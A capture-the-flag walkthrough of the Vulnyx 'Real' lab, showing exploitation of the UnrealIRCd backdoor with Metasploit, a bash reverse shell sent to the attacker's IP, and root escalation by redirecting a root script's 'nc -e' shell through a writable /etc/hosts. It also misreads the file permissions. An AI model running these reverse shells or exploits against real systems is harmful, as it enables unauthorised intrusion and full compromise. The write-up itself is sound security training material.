# Vulnyx – Real Lab


<img width="847" height="253" alt="Screenshot_2026-09-23_11-17-55" src="https://github.com/user-attachments/assets/b9e9b481-1946-4233-83f6-55c045ead962" />

A complete walkthrough of the **Vulnyx – Real** machine, covering reconnaissance, vulnerability identification, exploitation of the UnrealIRCd backdoor, shell stabilization, privilege escalation, and flag retrieval.

> **Lab environment:** Vulnyx – Real
> **Target IP:** `192.168.1.88`
> **Attacker IP:** `192.168.1.2`

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [UnrealIRCd Backdoor Verification](#2-unrealircd-backdoor-verification)
3. [Exploitation](#3-exploitation)
4. [Obtaining a Separate Reverse Shell](#4-obtaining-a-separate-reverse-shell)
5. [Upgrading the Shell to an Interactive TTY](#5-upgrading-the-shell-to-an-interactive-tty)
6. [Checking the Current User](#6-checking-the-current-user)
7. [Privilege Escalation Enumeration](#7-privilege-escalation-enumeration)
8. [Analyzing `/opt/task`](#8-analyzing-opttask)
9. [Analyzing `/etc/hosts`](#9-analyzing-etchosts)
10. [Obtaining the Root Shell](#10-obtaining-the-root-shell)
11. [Verifying Root Access](#11-verifying-root-access)
12. [Finding the User Flag](#12-finding-the-user-flag)
13. [Finding the Root Flag](#13-finding-the-root-flag)
14. [Attack Path Summary](#14-attack-path-summary)

---

# 1. Reconnaissance

The first step is to perform an Nmap scan against the IP address provided by the lab VM.

I used the following command:

```bash
nmap -sS -p- -sV -O --open --min-rate 5000 -n -oN scan 192.168.1.88
```

### Nmap Output

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 11:40 -0400
Nmap scan report for 192.168.1.88
Host is up (0.0012s latency).
Not shown: 52603 closed tcp ports (reset), 12929 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
6697/tcp open  irc     UnrealIRCd
MAC Address: 00:0C:29:B0:8E:60 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: Host: irc.foonet.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.92 seconds
```

### Findings

The scan shows three open TCP ports:

| Port | Service | Version       |
| ---- | ------- | ------------- |
| 22   | SSH     | OpenSSH 7.9p1 |
| 80   | HTTP    | Apache 2.4.38 |
| 6697 | IRC     | UnrealIRCd    |

The **UnrealIRCd running on port 6697** looks different.

UnrealIRCd is an open-source **Internet Relay Chat (IRC) server** used to manage IRC connections, chat rooms, and communication between users.

When researched, Older configurations of UnrealIRCd had a vulnerability "CVE-2010-2075". CVE-2010-2075 is a famous security vulnerability identifier representing a backdoor found in UnrealIRCd version 3.2.8.1.

Before attempting exploitation, I needed to verify whether the target was actually running the vulnerable version.

---

# 2. UnrealIRCd Backdoor Verification

Nmap provides an NSE script that can be used to check for the UnrealIRCd backdoor.

```bash
nmap -p 6697 --script irc-unrealircd-backdoor 192.168.1.88
```

### Output

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-23 12:01 -0400
Nmap scan report for 192.168.1.88
Host is up (0.0013s latency).

PORT     STATE SERVICE
6697/tcp open  ircs-u
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
MAC Address: 00:0C:29:B0:8E:60 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
```

The output indicates that the target appears to be running a **trojanized version of UnrealIRCd**.

This confirms that the UnrealIRCd service is potentially vulnerable to **CVE-2010-2075**.

---

# 3. Exploitation

I used **Metasploit Framework** to exploit the UnrealIRCd backdoor.

First, start Metasploit:

```bash
msfconsole
```

Then select the appropriate exploit module and configure it:

```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set LHOST 192.168.1.2
set LPORT 443
set RHOSTS 192.168.1.88
set RPORT 6667
set PAYLOAD cmd/unix/reverse_perl
exploit
```

### Metasploit Output

```text
Started reverse TCP handler on 192.168.1.2:443
[*] 192.168.1.88:6667 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.1.88:6667 - Connected to 192.168.1.88:6667
[*] 192.168.1.88:6667 - Trying to register a new IRC user: raisa
[+] 192.168.1.88:6667 - The target appears to be vulnerable. UnrealIRCd detected after registration
[*] 192.168.1.88:6667 - Connected to 192.168.1.88:6667
[*] 192.168.1.88:6667 - Sending IRC backdoor command
[*] Command shell session 1 opened (192.168.1.2:443 -> 192.168.1.88:38444) at 2026-09-23 12:10:55 -0400
```

The output confirms that the target is vulnerable and that a **command shell session** was successfully opened.

---

# 4. Obtaining a Separate Reverse Shell

Instead of continuing to use the Metasploit command shell, I created a separate reverse shell using Bash.

First, I opened another terminal on the attacker machine and started a Netcat listener:

```bash
nc -lnvp 443
```

Then, from the shell obtained on the target, I executed:

```bash
bash -i > /dev/tcp/192.168.1.2/443 0>&1
```

### Netcat Output

```text
listening on [any] 443 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.88] 34846
```

The connection was successfully established.

I now had a shell through the Netcat listener instead of relying on the original Metasploit session.

---

# 5. Upgrading the Shell to an Interactive TTY

The initial reverse shell was not a fully interactive terminal.

To make the shell easier to use, I upgraded it to an interactive TTY.

First, run:

```bash
script /dev/null -c bash
```

Then press:

```text
CTRL + Z
```

After returning to the local terminal, run:

```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

These commands configure the terminal and provide a more usable interactive Bash shell.

The reverse shell is now upgraded to an interactive TTY.

---

# 6. Checking the Current User

I then checked the current user with:

```bash
id
```

### Output

```text
uid=1000(server) gid=1000(server) groups=1000(server)
```

The output shows that I am logged in as the `server` user.

This is a standard user account, so the next objective is to perform **privilege escalation** and obtain root access.

---

# 7. Privilege Escalation Enumeration

One common privilege-escalation technique is to look for scheduled tasks or processes that execute with higher privileges.

For this, I used **pspy**, a process-monitoring tool that can be used to observe processes running on the system without requiring root privileges.

Download pspy using:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
```

After download, change its permissions:

```bash
chmod +x pspy64
```

Then run the tool:

```bash
./pspy64
```
<img width="1127" height="276" alt="Screenshot_2026-09-25_04-01-57" src="https://github.com/user-attachments/assets/a79f5b8a-35ae-4bde-97c1-a1299d5cbb88" />

While monitoring the output, I noticed that the following process was being executed repeatedly:

```text
/bin/bash /opt/task
```

The `/opt/task` was being executed automatically.

Stop the pspy and check the permissions of `/opt/task`:

```bash
ls -la /opt/task
```

### Output

```text
-rwx---r-- 1 root root 277 May  3  2023 /opt/task
```

I had read access to the file, so I could inspect its contents.

---

# 8. Analyzing `/opt/task`

I read the contents of the script:

```bash
cat /opt/task
```

### Output

```text
#!/bin/bash

domain='shelly.real.nyx'

function check(){

        timeout 1 bash -c "/usr/bin/ping -c 1 $domain" > /dev/null 2>&1
    if [ "$(echo $?)" == "0" ]; then
        /usr/bin/nohup nc -e /usr/bin/sh $domain 65000
        exit 0
    else
        exit 1
    fi
}

check
```

The script defines the following domain:

```text
shelly.real.nyx
```

It then attempts to ping that domain.

If the ping succeeds, the following command is executed:

```bash
nc -e /usr/bin/sh $domain 65000
```

This creates a connection to the specified domain on port `65000` and redirects a shell through that connection.

Since `/opt/task` was being executed automatically with elevated privileges, controlling where `shelly.real.nyx` resolves could potentially allow us to receive a shell running with those privileges.

---

# 9. Analyzing `/etc/hosts`

When the system attempts to communicate with `shelly.real.nyx`, the domain needs to be resolved to an IP address.

By default, Linux systems can use the `/etc/hosts` file for local domain-to-IP mappings.

So this script can be exploited through "Local DNS Hijacking" via /etc/hosts.If we can control where that domain points, we can force the script to connect to our machine instead.

First, I checked the permissions:

```bash
ls -la /etc/hosts
```

### Output

```text
-rw----rw- 1 root root 213 Sep 23 09:11 /etc/hosts
```

The permissions show that the file is writable by its owner and group. In this lab environment, the current user has the required write access.

I edited the file:

```bash
nano /etc/hosts
```

I added my IP address for the domain:

```text
192.168.1.2    shelly.real.nyx
```

After saving the file, `shelly.real.nyx` resolves to my IP address.

---

# 10. Obtaining the Root Shell

I then opened a Netcat listener on port `65000`:

```bash
nc -lvnp 65000
```

When `/opt/task` executes, the domain resolves to my IP address.

The ping succeeds, and the script then attempts to connect to the Netcat listener.

### Netcat Output

```text
listening on [any] 65000 ...
connect to [192.168.1.2] from (UNKNOWN) [192.168.1.88] 41140
```

The connection was successfully established.

At this point, I had obtained a shell running with the privileges of the process executing `/opt/task`.

---

# 11. Verifying Root Access

I verified the current user and hostname using:

```bash
id ; hostname
```

### Output

```text
uid=0(root) gid=0(root) groups=0(root)
real
```

The `uid=0(root)` output confirms that the shell is running with **root privileges**.

The privilege escalation was successful.

---

# 12. Finding the User Flag

Now that root access had been obtained, I retrieved the user flag.

```bash
cat /home/server/user.txt
```

### Output

```text
3b7fb7c1c8737a5c67dc513657e3efb3
```

The user flag was successfully obtained.

---

# 13. Finding the Root Flag

Finally, I navigated to the root user's home directory:

```bash
cat /root/root.txt
```

### Output

```text
593ba7e2d1e66b12e1488d6ea30c8787
```

The root flag was successfully obtained.

---

# 14. Attack Path Summary

The complete attack path can be summarized as follows:

```text
Nmap Scan
    ↓
UnrealIRCd Discovery
    ↓
CVE-2010-2075 Verification
    ↓
Metasploit Exploitation
    ↓
Command Shell
    ↓
Bash Reverse Shell
    ↓
Interactive TTY
    ↓
Privilege Escalation Enumeration
    ↓
pspy → /opt/task
    ↓
Analysis of /etc/hosts
    ↓
Hostname Resolution Manipulation
    ↓
Netcat Reverse Shell
    ↓
Root Access
    ↓
User Flag
    ↓
Root Flag
```

## Key Takeaways

* **Nmap** was used for initial reconnaissance and service enumeration.
* **UnrealIRCd** was identified as the main attack surface.
* **CVE-2010-2075** was verified using an Nmap NSE script.
* **Metasploit** was used to exploit the UnrealIRCd backdoor and obtain a command shell.
* The shell was converted into a more usable **interactive TTY**.
* **pspy** was used to identify a repeatedly executed privileged process.
* The `/opt/task` script revealed a hostname-based reverse-shell mechanism.
* The writable `/etc/hosts` file allowed the hostname resolution to be redirected to the attacker machine.
* A **Netcat listener** received the resulting privileged shell.
* `uid=0(root)` confirmed successful privilege escalation.
* Both the **user flag** and **root flag** were retrieved.

---

## Tools Used

| Tool            | Purpose                                |
| --------------- | -------------------------------------- |
| Nmap            | Port and service enumeration           |
| Nmap NSE        | UnrealIRCd backdoor detection          |
| Metasploit      | Exploitation of CVE-2010-2075          |
| Bash            | Reverse shell                          |
| Netcat          | Listener and shell connection          |
| pspy            | Process and scheduled-task enumeration |
| Linux utilities | Enumeration and privilege verification |

---
## Lab Summary

* Performed **Nmap reconnaissance** to identify open ports and running services.
* Discovered **UnrealIRCd** running on the target system.
* Verified the **CVE-2010-2075 UnrealIRCd backdoor** using an Nmap NSE script.
* Exploited the vulnerability using **Metasploit Framework** to obtain an initial command shell.
* Created a **Bash reverse shell** using Netcat.
* Upgraded the reverse shell to an **interactive TTY** for easier system interaction.
* Used **pspy** to monitor running processes and identify a repeatedly executed `/opt/task` script.
* Analyzed the script and identified a hostname-based reverse-shell mechanism.
* Exploited writable **`/etc/hosts`** to manipulate hostname resolution.
* Set up a Netcat listener and obtained a **root-level shell**.
* Verified root access using `id` and confirmed **UID 0**.
* Successfully retrieved both the **user flag** and **root flag**.

